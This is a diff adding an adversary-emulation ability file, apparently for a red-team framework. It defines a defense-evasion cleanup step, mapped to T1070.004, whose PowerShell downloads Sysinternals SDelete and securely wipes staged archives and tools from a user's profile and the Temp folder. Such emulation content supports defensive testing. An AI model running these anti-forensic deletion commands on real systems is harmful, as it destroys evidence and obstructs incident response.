@@ -1,0 +1,59 @@
+ability_id: 208b021b-c79a-4176-8ad1-3af99ed50c6f
+access: {}
+additional_info: {}
+buckets:
+- defensive-evasion
+delete_payload: true
+description: Cleanup files related to Operation
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "if (!$(test-path -path \"C:\\Program Files\\SysInternalsSuite\")) {\n\
+    \  mkdir \"C:\\Program Files\\SysInternalsSuite\";\n}\nset-location \"C:\\Program\
+    \ Files\\SysInternalsSuite\";\n\nif (!$(test-path -path \"sdelete64.exe\")) {\n\
+    \  iwr -uri \"https://download.sysinternals.com/files/SDelete.zip\" -outfile sdelete64.zip;\n\
+    \  Expand-Archive sdelete64.zip -force;\n}\ncopy sdelete64.exe C:\\Windows\\Temp\\\
+    ;\ncd C:\\Windows\\Temp\\ ;\n.\\sdelete64.exe /accepteula C:\\Windows\\Temp\\\
+    Rar.exe;\n.\\sdelete64.exe /accepteula C:\\Users\\#{profile_user}\\AppData\\Roaming\\\
+    working.zip;\n.\\sdelete64.exe /accepteula C:\\Users\\#{profile_user}\\Desktop\\\
+    working.zip;\nremove-item C:\\Windows\\Temp\\sdelete64.exe -force;"
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "if (!$(test-path -path \"C:\\Program Files\\SysInternalsSuite\")) {\n\
+    \  mkdir \"C:\\Program Files\\SysInternalsSuite\";\n}\nset-location \"C:\\Program\
+    \ Files\\SysInternalsSuite\";\n\nif (!$(test-path -path \"sdelete64.exe\")) {\n\
+    \  iwr -uri \"https://download.sysinternals.com/files/SDelete.zip\" -outfile sdelete64.zip;\n\
+    \  Expand-Archive sdelete64.zip -force;\n}\ncopy sdelete64.exe C:\\Windows\\Temp\\\
+    ;\ncd C:\\Windows\\Temp\\ ;\n.\\sdelete64.exe /accepteula C:\\Windows\\Temp\\\
+    Rar.exe;\n.\\sdelete64.exe /accepteula C:\\Users\\#{profile_user}\\AppData\\Roaming\\\
+    working.zip;\n.\\sdelete64.exe /accepteula C:\\Users\\#{profile_user}\\Desktop\\\
+    working.zip;\nremove-item C:\\Windows\\Temp\\sdelete64.exe -force;"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Artifact Cleanup - Delete Staged Files
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: defensive-evasion
+technique_id: T1070.004
+technique_name: 'Indicator Removal on Host: File Deletion'
